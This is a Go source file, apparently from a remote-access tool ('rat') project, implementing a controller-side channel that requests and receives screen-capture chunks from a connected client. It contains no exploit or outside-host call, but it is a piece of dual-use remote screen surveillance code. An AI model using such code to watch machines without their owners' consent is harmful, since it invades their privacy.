package main

import (
	"encoding/binary"
	"io"
	"rat/shared/network/header"
)

type ScreenChannel struct {
	Monitor bool
	ID      int32
	Scale   float32

	controller *Controller
}

func (ScreenChannel) Header() header.PacketHeader {
	return header.ScreenHeader
}

func (sc *ScreenChannel) init(channel io.Writer) (err error) {
	binary.Write(channel, binary.LittleEndian, sc.Monitor)
	binary.Write(channel, binary.LittleEndian, sc.Scale)
	err = binary.Write(channel, binary.LittleEndian, sc.ID)

	return
}

func (sc ScreenChannel) Open(channel io.ReadWriteCloser, c *Client) error {
	defer channel.Close()

	listener := sc.controller.Listen(ScreenEvent, c)
	defer listener.Unlisten()

	var err error

	err = sc.init(channel)

	go func() {
		for {
			select {
			case mi := <-listener.C:
				if mi == nil {
					channel.Close()
					return
				}

				msg := mi.(*ScreenMessage)

				if msg.Active {
					sc.init(channel)
				} else {
					channel.Close()
					return
				}
			case <-sc.controller.die:
				channel.Close()
				return
			case <-c.die:
				channel.Close()
				return
			}
		}
	}()

	for err == nil {
		var left, top, width, height int32

		binary.Read(channel, binary.LittleEndian, &left)
		binary.Read(channel, binary.LittleEndian, &top)
		binary.Read(channel, binary.LittleEndian, &width)
		err = binary.Read(channel, binary.LittleEndian, &height)
		if err != nil {
			break
		}

		var len int32
		err = binary.Read(channel, binary.LittleEndian, &len)

		if err != nil {
			break
		}

		buf := make([]byte, len)
		_, err = io.ReadFull(channel, buf)

		sendMessage(sc.controller, c, ScreenChunkMessage{
			Buffer: buf,
			X:      int(left),
			Y:      int(top),
			Width:  int(width),
			Height: int(height),
		})
	}

	return err
}

/*
type ScreenPacket struct {
	Active bool    `network:"send"`
	Scale  float32 `network:"send"`

	// Monitor is true if this is a whole screenshot, or a single window
	Monitor bool `network:"send"`

	// Handle to monitor or window
	Handle int `network:"send"`

	Buffer []byte `network:"receive"`

	//incoming
	Width  int
	Height int
}

func (packet ScreenPacket) Header() header.PacketHeader {
	return header.ScreenHeader
}

func (packet ScreenPacket) Init(c *Client) {

}

func (packet ScreenPacket) OnReceive(c *Client) error {
	fmt.Println("packet recv, buf bytes", len(packet.Buffer))

	if ws, ok := c.Listeners[header.ScreenHeader]; ok {
		err := sendMessage(ws, c, ScreenFrameMessage{
			Buffer: packet.Buffer,
			Width:  packet.Width,
			Height: packet.Height,
		})

		if err != nil {
			return err
		}
	}
	return nil
}

func (packet ScreenPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
*/